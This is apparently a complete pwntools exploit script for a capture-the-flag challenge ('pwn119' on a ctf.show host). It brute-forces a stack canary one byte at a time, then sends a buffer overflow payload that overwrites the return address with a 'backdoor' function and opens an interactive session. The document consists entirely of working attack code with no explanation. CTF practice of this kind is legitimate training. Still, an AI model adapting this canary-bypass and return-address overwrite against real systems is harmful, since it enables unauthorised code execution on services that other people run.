from pwn import *
#context(arch = 'amd64',os = 'linux',log_level = 'debug')
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28110)
elf = ELF('./pwn119')


backdoor=elf.sym['backdoor']
canary = b'\x00'
for i in range(3):
    for j in range(0,256):
        print("idx:"+str(i)+":"+chr(j))
        payload = b'a' * (0x70 - 0xC) + canary + bytes([j])
        io.send(payload)
        sleep(0.3)
        text = io.recv()
        print(text)
        if (b"stack smashing detected" not in text):
            canary += bytes([j])
            print(b"Canary:" + canary)
            break

payload = b'a' * (0x70 - 0xc) + canary + b'a' * 0xc + p32(backdoor)
io.send(payload)
io.recv()
io.interactive()
